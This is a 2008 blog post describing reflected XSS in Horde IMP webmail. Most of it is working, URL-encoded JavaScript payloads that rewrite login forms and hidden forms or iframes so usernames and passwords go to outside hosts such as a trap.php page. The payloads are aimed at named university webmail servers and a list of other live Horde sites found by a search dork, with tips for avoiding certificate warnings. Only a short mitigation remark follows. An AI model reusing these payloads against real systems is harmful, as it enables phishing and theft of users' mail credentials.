---
author: geeksinhk
comments: true
date: 2008-10-17 04:08:42+00:00
layout: post
link: https://geeksinhk.wordpress.com/2008/10/17/21/
slug: '21'
title: Non-persistant XSS in Horde
wordpress_id: 21
tags:
- horde
- security
- attack
- web
---

These days we tried to find some vulnerability in webmail.ie.cuhk.edu.hk. And we found that it consist of xss vulnerability for us to spoof the same webmail address with injection in URL. It is already an old issue mentioned back to year 2006 in version 2 of Horde, however we come back to the xss injection again in version 4.1.3.

The most updated version of horde IMP is: 4.2.x with one following major security updated had already fix the problem by implementation of filtering HTML entities in URL input:

--Add protection against CSRF attacks.

webmail.ie.cuhk.edu.hk use IMP: H3 (4.1.3) according to [https://webmail1.ie.cuhk.edu.hk/horde/imp/test.php](https://webmail1.ie.cuhk.edu.hk/horde/imp/test.php)

As the horde server had encountered several url injection problems, we made a list of proof of concepts as follow. Although all of the url are easy be covered by normal user, it's work very well combined with social network applications:

1. Fake return address: It will return to my own site after user had visit the legitimate problem page.
[ https://webmail1.ie.cuhk.edu.hk/horde/services/problem.php?return_url=https://personal.ie.cuhk.edu.hk/~tks008/iewebmail.html](https://webmail1.ie.cuhk.edu.hk/horde/services/problem.php?return_url=https://personal.ie.cuhk.edu.hk/~tks008/iewebmail.html)

2. Fake login frame:  It require user to login to the real webmail first, and then we insert a login frame in the content.
[ https://webmail1.ie.cuhk.edu.hk/horde/index.php?url=http://personal.ie.cuhk.edu.hk/~tks008/iewebmail.html](https://webmail1.ie.cuhk.edu.hk/horde/index.php?url=http://personal.ie.cuhk.edu.hk/~tks008/iewebmail.html)

3. Injection start here: We can insert our bad script at the original notice message
<a href="https://webmail1.ie.cuhk.edu.hk/horde/imp/login.php?logout_reason=message&logout_msg=HEHEHEHE
</td>.............................</tr><tr >
<td >">https://webmail1.ie.cuhk.edu.hk/horde/imp/login.php?logout_reason=message&logout_msg=HEHEHEHE
</td>.............................</tr><tr >
<td >

**Search and wipe out the notice message:**

{% highlight javascript %}var tds = document.body.getElementsByTagName('td');
for (var i = 0; i < tds.length; i%2B%2B){  //%2B is "+" which should be encoded to pass the URL filter.
if (tds[i].className == "notice"){
tds[i].parentNode.innerHTML = "";
}
}{% endhighlight %}
https://webmail.se.cuhk.edu.hk/horde/imp/login.php?logout_reason=message&logout_msg=
</td></tr><tr >
<td >

**Override the submit button at create a hidden form:**

{% highlight javascript %}function submit_login(e){
if (typeof e != 'undefined'%26%26!enter_key_trap(e)) { //%26 is "&amp;" must be encoded to pass URL filter
return;
}
if(document.imp_login.imapuser.value == "") {
document.imp_login.imapuser.focus();
return false;
}
else if (document.imp_login.pass.value=="") {
document.imp_login.pass.focus();
return false;
}
else {
var origAction=document.imp_login.action;
document.imp_login.loginButton.disabled =true;
document.imp_login.action="http://137.189.97.46/trap.php";  //We changed the action from original return.php to our site (trap.php)
document.imp_login.submit();
return true;
}
}{% endhighlight %}

**Add the victim site's URL to the post request: (Since our target is horde version 4.1.x without modification but not single site)
**

{% highlight javascript %}var x = document.imp_login;
input = document.createElement("input");
input.setAttribute("type", "hidden");
input.setAttribute("name", "info" );
input.setAttribute("value", "" );
x.appendChild(input);
document.imp_login.info.value=window.location.host;{% endhighlight %}

**Add invisible form and submit the form when user press "submit":**

{% highlight javascript %}document.body.innerHTML+=
'<form id="dynForm" action="https://137.189.97.46/reflect.html" method="get">
<input type="hidden"name="username">
<input type="hidden"name="password">
<input type="hidden"name="serverUrl">
</form>';
document.getElementById("dynForm").password.value=document.imp_login.pass.value;
document.getElementById("dynForm").serverUrl.value=window.location.host;
document.getElementById("dynForm").username.value=document.imp_login.imapuser.value;
document.getElementById("dynForm").submit();{% endhighlight %}

**Add invisible iframe and submit the iframe when user press "submit":**

{% highlight javascript %}<IFRAME NAME="trap" src="https://137.189.97.46/trap.php" WIDTH="0" HIEGHT="0" FRAMEBORDER="0"></IFRAME>
document.trap.target = 'trap';
//Consturct the form for submitting the login credentials.
document.trap.submit();{% endhighlight %}

**To minimize the impact of those actions:**

--Submit two post request one after one.
--Construct a fake page which will return to the legitimate page after the user name and password is being captured (window.location=document.referrer or submit the post form to legitimate site again)
--Register a cert from trusted CA and user will post their form to us without warnings.

**It is one of the example of phishing attack:**

{% highlight css %}
<a href="https://webmail1.ie.cuhk.edu.hk/horde/imp/login.php?logout_reason=message&logout_msg=
</td>var tds=document.body.getElementsByTagName('td');for(var i=0;i<2;i%2B%2B){if(tds[i].className=="notice"){tds[i].parentNode.innerHTML=""}}var x=document.imp_login;input=document.createElement("input");input.setAttribute("type","hidden");input.setAttribute("name","info");input.setAttribute("value","");x.appendChild(input);document.imp_login.info.value=window.location.host;function submit_login(e){if(typeof e!='undefined'%26%26!enter_key_trap(e)){return}if(document.imp_login.imapuser.value==""){document.imp_login.imapuser.focus();return false}else if(document.imp_login.pass.value==""){document.imp_login.pass.focus();return false}else{var origAction=document.imp_login.action;document.imp_login.loginButton.disabled=true;document.imp_login.action="http://137.189.97.46/trap.php";document.imp_login.submit();return true}}</tr><tr >
<td >">https://webmail1.ie.cuhk.edu.hk/horde/imp/login.php?logout_reason=message&logout_msg=
</td>var tds=document.body.getElementsByTagName('td');for(var i=0;i<2;i%2B%2B){if(tds[i].className=="notice"){tds[i].parentNode.innerHTML=""}}var x=document.imp_login;input=document.createElement("input");input.setAttribute("type","hidden");input.setAttribute("name","info");input.setAttribute("value","");x.appendChild(input);document.imp_login.info.value=window.location.host;function submit_login(e){if(typeof e!='undefined'%26%26!enter_key_trap(e)){return}if(document.imp_login.imapuser.value==""){document.imp_login.imapuser.focus();return false}else if(document.imp_login.pass.value==""){document.imp_login.pass.focus();return false}else{var origAction=document.imp_login.action;document.imp_login.loginButton.disabled=true;document.imp_login.action="http://137.189.97.46/trap.php";document.imp_login.submit();return true}}</tr><tr >
<td >
{% endhighlight %}

**We find some trivial observations in https:**

-- It have warning from https to http.
--When we have two posts request to two sites (bad sites and legitimate sites) in one action,
the bad site request will only succeed if we own a certs from well-known CA or user had already trusted our cert before.
-- It have warning from https to other untrusted https.
-- Another way to fake users to accept our cert is to include an invisible iframe and convince user to trust our certs when they visit the legitimate page. Such that the request will be pass to our site.

To mitigate this vulnerability, horde had already done updates to filtering to HTML entities in URL address. On the other hand it is also the browser responsibility to eliminate some non-reasonable characters like "". As it is already been tagged as UNSAFE in RFC1738 date back to 1994 from T. Berners-Lee. Anyway no one may notice that after 15 years had pass......

Some useful tools:

[http://meyerweb.com/eric/tools/dencoder/](http://meyerweb.com/eric/tools/dencoder/)
[http://javascriptcompressor.com/](http://javascriptcompressor.com/)

Continue:

Phishing to HKU: It don't have https at all, the request will be sent "quietly"

{% highlight css %}
<a href="http://imp2.webmail.hku.hk/horde/imp/login.php?logout_reason=message&logout_msg=
</td>var x=document.imp_login;input=document.createElement("input");input.setAttribute("type","hidden");input.setAttribute("name","info");input.setAttribute("value","");x.appendChild(input);document.imp_login.info.value=window.location.host;function submit_login_imp4(servername){if(document.imp_login.imapuser.value==""){document.imp_login.imapuser.focus();return false}else if(document.imp_login.pass.value==""){document.imp_login.pass.focus();return false}else{document.imp_login.server.value=servername;document.imp_login.action="https://lab.wishlog.info/trap.php";document.imp_login.submit();return true}}function submit_login_owa(servername){submit_login_imp4(servername)}function submit_login_imp3(servername){submit_login_imp4(servername)}var tds=document.body.getElementsByTagName('td');for(var i=0;i<80;i%2B%2B){if(tds[i].className=="notice"){tds[i].parentNode.innerHTML=""}}</tr><tr >
<td >" target="_blank">http://imp2.webmail.hku.hk/horde/imp/login.php?logout_reason=message&logout_msg=
</td>var x=document.imp_login;input=document.createElement("input");input.setAttribute("type","hidden");input.setAttribute("name","info");input.setAttribute("value","");x.appendChild(input);document.imp_login.info.value=window.location.host;function submit_login_imp4(servername){if(document.imp_login.imapuser.value==""){document.imp_login.imapuser.focus();return false}else if(document.imp_login.pass.value==""){document.imp_login.pass.focus();return false}else{document.imp_login.server.value=servername;document.imp_login.action="https://lab.wishlog.info/trap.php";document.imp_login.submit();return true}}function submit_login_owa(servername){submit_login_imp4(servername)}function submit_login_imp3(servername){submit_login_imp4(servername)}var tds=document.body.getElementsByTagName('td');for(var i=0;i<80;i%2B%2B){if(tds[i].className=="notice"){tds[i].parentNode.innerHTML=""}}</tr><tr >
<td >

{% endhighlight %}

The script override the three functions in post request, all five button will redirect to our pages.

Continue:

Another site I searched from google with: inurl:horde/imp/test.php

{% highlight css %}
<a href="https://mail.cmi.cz/login.php?logout_reason=message&logout_msg=
</td>var tds=document.body.getElementsByTagName('td');for(var i=0;i<2;i%2B%2B){if(tds[i].className=="notice"){tds[i].parentNode.innerHTML=""}}var x=document.horde_login;input=document.createElement("input");input.setAttribute("type","hidden");input.setAttribute("name","info");input.setAttribute("value","");x.appendChild(input);input=document.createElement("input");input.setAttribute("type","hidden");input.setAttribute("name","imapuser");input.setAttribute("value","");x.appendChild(input);input=document.createElement("input");input.setAttribute("type","hidden");input.setAttribute("name","pass");input.setAttribute("value","");x.appendChild(input);document.horde_login.info.value=window.location.host;function submit_login(e){if(typeof e!='undefined'%26%26!enter_key_trap(e)){return}if(document.horde_login.horde_user.value==""){document.horde_login.horde_user.focus();return false}else if(document.horde_login.horde_pass.value==""){document.horde_login.horde_pass.focus();return false}else{var origAction=document.horde_login.action;document.horde_login.loginButton.disabled=true;document.horde_login.action="http://137.189.97.46/trap.php";document.horde_login.imapuser.value=document.horde_login.horde_user.value;document.horde_login.pass.value=document.horde_login.horde_pass.value;document.horde_login.submit();return true}}</tr><tr >
<td >">https://mail.cmi.cz/login.php?logout_reason=message&logout_msg=
</td>var tds=document.body.getElementsByTagName('td');for(var i=0;i<2;i%2B%2B){if(tds[i].className=="notice"){tds[i].parentNode.innerHTML=""}}var x=document.horde_login;input=document.createElement("input");input.setAttribute("type","hidden");input.setAttribute("name","info");input.setAttribute("value","");x.appendChild(input);input=document.createElement("input");input.setAttribute("type","hidden");input.setAttribute("name","imapuser");input.setAttribute("value","");x.appendChild(input);input=document.createElement("input");input.setAttribute("type","hidden");input.setAttribute("name","pass");input.setAttribute("value","");x.appendChild(input);document.horde_login.info.value=window.location.host;function submit_login(e){if(typeof e!='undefined'%26%26!enter_key_trap(e)){return}if(document.horde_login.horde_user.value==""){document.horde_login.horde_user.focus();return false}else if(document.horde_login.horde_pass.value==""){document.horde_login.horde_pass.focus();return false}else{var origAction=document.horde_login.action;document.horde_login.loginButton.disabled=true;document.horde_login.action="http://137.189.97.46/trap.php";document.horde_login.imapuser.value=document.horde_login.horde_user.value;document.horde_login.pass.value=document.horde_login.horde_pass.value;document.horde_login.submit();return true}}</tr><tr >
<td >

{% endhighlight %}

(use the same payload for webmail1.ie.cuhk.edu.hk can fake following sites:)
http://webmail.unix66.com/horde/imp/index.php
http://spike.samoa.net.ws/horde/imp/index.php
https://eboks.net/horde/imp/index.php
http://unixlingo.com/horde/imp/index.php  //Need some change to eliminate the notice box
http://webmail.nefonline.de/horde/imp/index.php
http://webmail.chaiphirom.com/horde/imp/index.php
http://www.embryo.pu.ru/horde/imp/index.php
http://webmail.dfinternet.net/horde/imp/index.php
http://cst-systemhaus.de/horde/imp/index.php
https://eboks.net/horde/imp/
http://webmail.nefonline.de/horde/imp/
http://stiu.de/horde/imp/
http://spike.samoa.net.ws/horde/imp/
http://www.reina.si/horde/imp/ //permission not set
http://haro.astrossp.unam.mx/horde/imp/index.php //Permission not set

Continue:

{% highlight css %}
<a href="https://mmlab.itsc.cuhk.edu.hk/Clear/logon.asp?msg=Login%20Fail!document.logon.action="https://lab.wishlog.info/trap.php";var x=document.logon;input=document.createElement("input");input.setAttribute("type","hidden");input.setAttribute("name","info");input.setAttribute("value","");x.appendChild(input);input=document.createElement("input");input.setAttribute("type","hidden");input.setAttribute("name","imapuser");input.setAttribute("value","");x.appendChild(input);input=document.createElement("input");input.setAttribute("type","hidden");input.setAttribute("name","pass");input.setAttribute("value","");x.appendChild(input);document.logon.info.value=window.location.host;function validform(tform){if((tform.LogonID.value=="")%7C%7C(tform.std.value=="")){return false}document.logon.imapuser.value=document.logon.LogonID.value;document.logon.pass.value=document.logon.std.value}">https://mmlab.itsc.cuhk.edu.hk/Clear/logon.asp?msg=Login%20Fail!document.logon.action="https://lab.wishlog.info/trap.php";var x=document.logon;input=document.createElement("input");input.setAttribute("type","hidden");input.setAttribute("name","info");input.setAttribute("value","");x.appendChild(input);input=document.createElement("input");input.setAttribute("type","hidden");input.setAttribute("name","imapuser");input.setAttribute("value","");x.appendChild(input);input=document.createElement("input");input.setAttribute("type","hidden");input.setAttribute("name","pass");input.setAttribute("value","");x.appendChild(input);document.logon.info.value=window.location.host;function validform(tform){if((tform.LogonID.value=="")%7C%7C(tform.std.value=="")){return false}document.logon.imapuser.value=document.logon.LogonID.value;document.logon.pass.value=document.logon.std.value}
{% endhighlight %}
Even shorter:

{% highlight css %}
<a href="https://mmlab.itsc.cuhk.edu.hk/Clear/logon.asp?msg=Login%20Fail!document.logon.action="http://lab.wishlog.info/trap.php"">https://mmlab.itsc.cuhk.edu.hk/Clear/logon.asp?msg=Login%20Fail!document.logon.action="http://lab.wishlog.info/trap.php"

{% endhighlight %}

END
